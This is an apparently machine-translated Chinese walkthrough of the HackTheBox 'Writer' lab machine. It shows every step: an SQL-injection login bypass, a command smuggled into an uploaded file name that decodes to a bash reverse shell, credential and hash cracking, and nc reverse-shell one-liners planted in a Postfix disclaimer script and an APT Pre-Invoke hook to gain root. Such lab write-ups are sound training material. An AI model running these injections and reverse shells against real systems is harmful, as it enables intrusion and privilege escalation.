# 来自 HackTheBox 的编写器—详细演练

> 原文：<https://infosecwriteups.com/writer-from-hackthebox-detailed-walkthrough-3d82582a7f2d?source=collection_archive---------2----------------------->

展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/bd50d4ed463df9aa28603cb0bf24d2af.png)

黑客盒子作者

Writer 是 HackTheBox 上的一台中型机器。我们首先列举一个引导我们进入登录页面的网站，很容易绕过这个页面进入仪表板。调查显示上传图像的文件名没有被正确清理，所以我们使用它来获得一个反向外壳。我们找到了 MySQL 数据库的凭证，这反过来又给了我们一个用户散列。我们破解它，通过 SSH 连接，发现我们的升级路径是通过 Postfix。这导致我们以第二个用户的身份连接，我们发现错误配置的权限允许我们利用 conf.d 文件夹以 root 用户的身份连接 shell。

对于一个中等的盒子来说，这是相当复杂的。所以我希望你和我一样喜欢它。

需要的技能是网络和操作系统枚举和使用打嗝来调查。学到的技能是对 postfix 的详细了解以及如何使用它。以及如何使用文件清理以及如何利用它。

[](https://www.hackthebox.com/home/machines/profile/361) [## 侵入测试实验室

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.com](https://www.hackthebox.com/home/machines/profile/361) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/e8bb7de4a90330ea9ae3e813204b58e7.png)

盒子的 Nmap 扫描

我们有 SSH、SMB 和端口 80 上的网站。由于我们在 Linux CTF 上不经常看到 SMB，所以我从那里开始，但首先将 IP 添加到我们主机的文件中:

```
┌──(root💀kali)-[~/htb/writer]
└─# echo "10.10.11.101 writer.htb" >> /etc/hosts
```

# SMBMap

现在让我们使用 smbmap:

```
┌──(root💀kali)-[~/htb/writer]
└─# smbmap -H writer.htb
[+] IP: writer.htb:445  Name: unknown
    Disk                 Permissions     Comment
    ----                 -----------     -------
    print$               NO ACCESS       Printer Drivers
    writer2_project      NO ACCESS
    IPC$                 NO ACCESS       IPC Service (writer server
```

# Enum4Linux

没有开放共享，用 enum4linux 看看吧:

```
┌──(root💀kali)-[~/htb/writer]
└─# enum4linux -a writer.htb                    
Starting enum4linux v0.8.9 on Mon Oct 11 22:04:49 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... writer.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ================================================================ 
|  Users on writer.htb via RID cycling (RIDS: 500-550,1000-1050) |
 ================================================================ 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1663171886-1921258872-720408159
[I] Found new SID: S-1-5-32
S-1-22-1-1000 Unix User\kyle (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-5-21-1663171886-1921258872-720408159-1000 WRITER\kyle (Local User)

enum4linux complete on Mon Oct 11 22:06:30 2021
```

我砍掉了大部分输出，但是在上面我们看到两个用户已经找到了 kyle 和 john。我让九头蛇尝试用 rockyou wordlist 破解这两个账户的密码。如果你想了解更多关于 SSH 强力的选项，这篇文章是非常有用的

如果你想让用户遵循预定的路径，那么就从这里开始。如果你想走更快更简单的路，向下滚动到更下面的部分。

# 预期路径

在运行的时候，我浏览了一下 80 端口的网站:

![](img/f5e8cfe76ce2ad13de0772cbc6894919.png)

80 端口上的 writer.htb webtsite

# Feroxbuster

这是一个静态的博客，里面有很多乍看上去毫无新意的文章。我注意到在“关于”页面上有一个用户 admin@writer.htb。让我们来看看 Feroxbuster:

![](img/863c202b5f4e5112b8be94ab2481aebf.png)

Ferroxbuster 产量

从列表中，我们看到文件夹/管理有 200 个响应，让我们看看:

![](img/e9ecc6e4622e08318d8513e20121ddd0.png)

管理员登录页面

# SQLi 旁路

我们有一个管理员登录页面。我尝试了一些不起作用的标准凭证，所以我使用了[这个](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet) SQLi 备忘单，看看我们是否可以绕过登录:

![](img/e9d5fd12e8f06acb235628be879ee689.png)

SQL 旁路

这招奏效了，我来到了仪表盘前:

![](img/bd30ab3c38171b2ce60cff0324881768.png)

管理仪表板

点击左边的三个破折号并选择 Stories，我们将到达这里:

![](img/92f084257ef745fffdc58aa3bc8597e2.png)

故事页面

点击第一篇文章右侧的编辑按钮，我们将进入以下页面:

![](img/3ab56ff09a7f666abc6efc9ea133eeae.png)

编辑故事

浏览按钮让我们上传一张图片，尝试其他东西。jpg 给出一个错误:

![](img/8aa274c3033dfd78031958c0ef5ec1f0.png)

无效的文件扩展名

# 图像文件处理

然而，像. jpg.php 这样的双文件扩展名也可以。所以表明它没有正确地净化输入。我们可以通过创建一个扩展名为 jpg 的空文件进行测试，然后在以下内容后添加注释:

```
┌──(root💀kali)-[~/htb/writer]
└─# touch 'test.jpg; `pencer`'
```

上传文件然后拦截打嗝，看看会发生什么:

![](img/1ff735b55821c0b795bdbb47aa7dfbb7.png)

打嗝拦截

我们看到它在这一点上没有被剥离，如果我们转发请求，它似乎已经保存了文件。

回顾之前的 Feroxbuster 扫描，我们看到它找到了一个存放图像的文件夹，我们可以用 curl 查看里面:

![](img/1992099d09872cc612effd1d28f474e4.png)

显示文件已上传的 Curl 输出

我们在底部看到了我最初的 test.jpg，第二个文件在文件名后添加了单词，这样我们就知道成功上传后文件的最终位置。

第二部分花了我一段时间才弄明白，但是我们可以做的是使用 image_url 参数来执行代码。首先创建一个包含我们命令的字符串来连接一个反向 shell，我只是使用了一个经典的 PenTestMonkey:

```
┌──(root💀kali)-[~/htb/writer]
└─# echo -n "bash -c 'bash -i >& /dev/tcp/10.10.15.27/1337 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn
```

我用了 base64 编码来避免上传时出现任何问题。

现在创建一个新的镜像文件，像我们之前测试的那样附加上我们的 shell 代码:

```
touch 'pencer.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn | base64 -d | bash `;'
```

在上面，我已经使用 echo 将编码的 shell 传递给 base64 -d，将其解码回原始版本，然后传递给 bash 来执行它。

现在我们需要像以前一样通过浏览一个现有的故事并选择它，然后保存它来上传文件。我们可以再次检查它是用 curl 上传的:

```
┌──(root💀kali)-[~/htb/writer]
└─# curl http://writer.htb/static/img/
<SNIP>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="pencer.jpg;%20%60echo%20YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn%20%7c%20base64%20-d%20%7c%20bash%20%60;">pencer.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn | base64 -d | bash `;</a></td><td align="right">2021-10-13 21:48  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
```

最后，我们再次上传附加了 shell 的图像，但这次在 Burp 中捕获它，并将路径添加到文件中:

![](img/980e3e9e4d262123fa9fa3df1636cd68.png)

打嗝时操作

在这里，我们使用了之前制定的文件路径，并使用它将已经上传的图像添加到 image_url 部分。当您在 Burp 中单击 Forward 时，web 服务器会执行添加的额外内容，因此请确保您有一个 Netcat 侦听器在您之前创建字符串时使用的端口上等待。

# WWW-数据外壳

上传后切换到 netcat 查看我们有一个 shell 连接:

```
┌──(root💀kali)-[~/htb/writer]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.15.27] from (UNKNOWN) [10.10.11.101] 53962
bash: cannot set terminal process group (1073): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$
```

在我们继续之前升级终端:

```
www-data@writer:/$ which python
which python
www-data@writer:/$ which python3
which python3
/usr/bin/python3

www-data@writer:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@writer:/$ ^Z
zsh: suspended  nc -nlvp 1337
┌──(root💀kali)-[~/htb/writer]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337

www-data@writer:/$ export TERM=xterm
www-data@writer:/$ stty rows 52 cols 237
```

环顾四周，我在/etc 中找到了一个 MySQL 文件夹:

```
www-data@writer:/etc/mysql$ ls -lsa
4 drwxr-xr-x   2 root root 4096 May 18 15:51 conf.d
4 -rwxr-xr-x   1 root root 1620 May  9 18:20 debian-start
4 -rw-------   1 root root  261 May 18 15:51 debian.cnf
4 -rw-r--r--   1 root root  972 May 19 12:34 mariadb.cnf
4 drwxr-xr-x   2 root root 4096 May 18 15:51 mariadb.conf.d
0 lrwxrwxrwx   1 root root   24 May 18 15:51 my.cnf -> /etc/alternatives/my.cnf

www-data@writer:/etc/mysql$ cat my.cnf
<SNIP>

[client]
database = dev
user = djangouser
password = <HIDDEN>
default-character-set = utf8
```

# MySQL 枚举

我使用 creds 枚举 MySQL 服务器来查找用户散列:

![](img/4304f715f28e1febc90f93dc587d2150.png)

MySQL 数据库枚举

# 哈希卡特

让我们来破解它:

![](img/9ba2c869a26626e7c63d98d88f8a76f4.png)

哈希标识它的名称

启动 hashcat 和 rockyou:

```
┌──(root💀kali)-[~/htb/writer]
└─# hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 10000        
hashcat (v6.1.1) starting...

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

<HIDDEN>

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Thu Oct 14 22:06:04 2021 (1 min, 5 secs)
Time.Estimated...: Thu Oct 14 22:07:09 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      157 H/s (18.67ms) @ Accel:256 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10240/14344385 (0.07%)
Rejected.........: 0/10240 (0.00%)
Restore.Point....: 9216/14344385 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259584-259999
Candidates.#1....: rubberducky -> 1asshole

Started: Thu Oct 14 22:04:54 2021
Stopped: Thu Oct 14 22:07:09 2021
```

几分钟后我们得到了凯尔的密码。

# 容易的道路

我们不需要费那么大力气去获取凯尔的密码，我们可以直接强行破解。下面是我在演练开始时设置 Hydra 的情况:

![](img/e55c6bdd0c3ec695aa847fa7587aed75.png)

九头蛇 SSH 密码破解

# 水螅

是的，20 分钟后，它让我到达了预定路径上所有工作的同一点！当然，我们是来学习的，所以希望你用了正确的方法。

# 用户 Kyle 访问

有了 Kyle 的密码，我们现在可以通过 SSH 登录:

```
┌──(root💀kali)-[~/htb/writer]
└─# ssh kyle@writer.htb        
ECDSA key fingerprint is SHA256:GX5VjVDTWG6hUw9+T11QNDaoU0z5z9ENmryyyroNIBI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'writer.htb,10.10.11.101' (ECDSA) to the list of known hosts.
kyle@writer.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

Last login: Mon Oct 11 15:31:14 2021 from 10.10.14.202
kyle@writer:~$
```

先抢旗:

```
kyle@writer:~$ cat user.txt 
<HIDDEN>
```

现在检查用户，我们看到一个名为过滤器的组:

```
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```

# 利用后缀

我们可以搜索该组可以访问哪些文件:

```
kyle@writer:~$ find / -group filter -type f 2>/dev/null
/etc/postfix/disclaimer

kyle@writer:~$ file /etc/postfix/disclaimer
/etc/postfix/disclaimer: POSIX shell script, ASCII text executable

kyle@writer:~$ cat /etc/postfix/disclaimer
#!/bin/sh
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69
<SNIP>
```

该文件与 Ubuntu 的默认邮件传输代理[后缀](https://ubuntu.com/server/docs/mail-postfix)一起使用。我们可以假设我们的升级路径是通过此文件，因为它明确属于我们的用户所在的组。这里的一些背景阅读[帮助我理解了后缀和免责声明是如何工作的。](https://mobt3ath.com/uplode/books/book-27297.pdf)

首先，我们检查 postfix 是否正在运行:

![](img/d0fc21f798672e007f61708b61d9e185.png)

使用 netstat 检查进程

回头看免责声明文件，我看到时间戳正在改变:

```
kyle@writer:/etc/postfix$ ls -l disclaimer
-rwxrwxr-x 1 root filter  1021 Oct 14 22:04 disclaimer

kyle@writer:/etc/postfix$ ls -l
-rwxrwxr-x 1 root filter  1101 Oct 14 22:08 disclaimer
```

我试着编辑免责声明文件，并在其中添加了一条注释，这条注释在时间戳更新时被删除了。因此，这证实了我们有一个有限的窗口来更改免责声明文件并发送电子邮件来触发它的运行。

还有一个文件显示了将对其运行免责声明脚本的地址:

```
kyle@writer:/etc/postfix$ cat disclaimer_addresses
root@writer.htb
kyle@writer.htb
```

[这篇](https://baturorkun.medium.com/disclaimer-to-outgoing-emails-2ce576a6433b)文章证实了免责声明脚本已经被更改为使用 addresses 文件，所以我们知道我们需要向/从其中一个地址发送电子邮件来触发它。

我们需要一种在机器上发送本地电子邮件的方法，快速搜索发现了我们可以使用的 RealPython 上的这个发送邮件脚本。

我们可以删减很多，使之更简单，创建一个空白文件:

```
kyle@writer:~$ nano /dev/shm/sendmail.py
```

将我们的 Python 版本粘贴到其中并保存:

```
import smtplib

try:
    server = smtplib.SMTP('localhost')
    server.sendmail('kyle@writer.htb', 'john@writer.htb', 'Shell Time!')
    print("Mail sent")
except error: 
    print("Mail failed to send")
finally:
    server.quit()
```

现在将免责声明文件复制到/dev/shm 并进行编辑，这样我们在开始时就有了反向 shell:

```
#!/bin/sh
# Localize these.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.39 4444 >/tmp/f

INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
<SNIP>
```

接下来，我们需要将修改后的免责声明文件复制回 postfix 文件夹，然后通过发送电子邮件来触发它:

```
kyle@writer:~$ cp /dev/shm/disclaimer /etc/postfix/disclaimer && python3 /dev/shm/sendmail.py
Mail sent
```

# 用户 John Access

切换到我们的等待 netcat 监听器，查看我们已经连接了 shell:

```
┌──(root💀kali)-[~]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.39] from (UNKNOWN) [10.10.11.101] 36350
/bin/sh: 0: can't access tty; job control turned off
$
```

让我们四处看看:

```
$ whoami
john

$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ cd /home/john
$ ls -la 
-rw-r--r-- 1 john john 3771 May 14 18:19 .bashrc
drwx------ 2 john john 4096 Jul 28 09:19 .cache
-rw-r--r-- 1 john john  807 May 14 18:19 .profile
drwx------ 2 john john 4096 Jul  9 12:29 .ssh

$ ls -lsa .ssh
4 -rw-r--r-- 1 john john  565 Jul  9 12:29 authorized_keys
4 -rw------- 1 john john 2602 Jul  9 12:29 id_rsa
4 -rw-r--r-- 1 john john  565 Jul  9 12:29 id_rsa.pub

$ cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gt
<SNIP>
BwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ/N64NhIxRh5
Nwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

我发现约翰有一个. ssh 文件夹，里面有他的钥匙。我将它复制到 Kali，并使用它来 SSH 以获得更好的 shell:

```
┌──(root💀kali)-[~/htb/writer]
└─# nano id_rsa  

┌──(root💀kali)-[~/htb/writer]
└─# chmod 600 id_rsa

┌──(root💀kali)-[~/htb/writer]
└─# ssh -i id_rsa john@writer.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
john@writer:~$
```

现在我们通过 SSH 进入，我们可以再看一看:

```
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

# 利用 apt。会议文件

我们可以看到 John 在一个名为“管理”的组中，就像我们为 Kyle 所做的那样。让我们看看该组提供了哪些访问权限:

```
john@writer:~$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d

john@writer:~$ ls -lsa /etc/apt
total 36
4 drwxr-xr-x   7 root root       4096 Jul  9 10:59 .
4 drwxr-xr-x 102 root root       4096 Jul 28 06:32 ..
4 drwxrwxr-x   2 root management 4096 Jul 28 09:24 apt.conf.d
4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 auth.conf.d
4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 preferences.d
4 -rw-r--r--   1 root root       2777 May 13 21:57 sources.list
4 -rw-r--r--   1 root root       2743 Feb  1  2021 sources.list.curt
4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 sources.list.d
4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 trusted.gpg.d
```

我们看到 John 拥有对该文件夹的写权限。关于 apt.conf.d 文件夹的信息来自[此处](https://debian-handbook.info/browse/wheezy/sect.apt-get.html):

```
Each directory represents a configuration file which is split 
over multiple files. In this sense, all of the files in /etc/apt/apt.conf.d/ are instructions for the configuration of APT. APT includes them in alphabetical order, so that the last ones can modify a configuration element defined in one of the first ones.
```

这里有一篇很好的文章讲述了我们如何使用我们对那个文件夹的权限来执行代码。

让我们在那里创建我们自己的配置文件:

```
john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.39 4444 >/tmp/f"};' > /etc/apt/apt.conf.d/rev_shell

john@writer:~$ ls -lsa /etc/apt/apt.conf.d/
4 -rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
<SNIP>
4 -rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
4 -rw-rw-r-- 1 john john        108 Oct 15 15:06 rev_shell
```

# 根标志

所以在上面，我将一个简单的 shell 回显到名为 rev_shell 的文件中。这将由 APT 服务处理，我们只需要有一个 Netcat 侦听器等待:

```
┌──(root💀kali)-[~]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.39] from (UNKNOWN) [10.10.11.101] 36708
#
```

随着我们的最终 shell 作为 root 连接，我们可以获取标志:

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
<HIDDEN>
```

完成了。下次见。

如果你喜欢这篇文章，请给我一两个掌声。这是免费的，它让我知道我正在写你感兴趣的内容。

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2021 年 12 月 12 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-writer)*。*